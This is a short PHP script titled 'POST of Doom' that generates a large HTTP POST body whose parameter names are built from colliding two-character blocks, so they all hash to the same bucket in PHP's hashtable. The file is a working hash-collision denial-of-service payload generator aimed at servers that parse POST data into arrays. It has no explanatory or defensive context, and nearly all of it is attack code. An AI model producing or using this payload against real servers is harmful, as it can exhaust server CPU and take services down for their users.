<?php
// generate POST of Doom

function doom() {
    // entries with collisions in PHP hashtable hash function 
    $a = array(
        '0' => 'Ez', 
        '1' => 'FY',
        '2' => 'G8',
        '3' => 'H' . chr(23),
        '4' => 'D' . chr(122+33),
//        '5' => 'C' . chr(122+33+33),
    );
    // how long should the payload be
    $length = 7;
    
    $size = count($a);

    $post = '';
    $max = pow($size,$length);
    for ($i = 0; $i < $max; $i++) {
        $s = str_pad(base_convert($i, 10, $size), $length, '0', STR_PAD_LEFT);
        $post .= '' . (urlencode(strtr($s, $a))) . '=&';
    }

    return $post;
}

echo doom();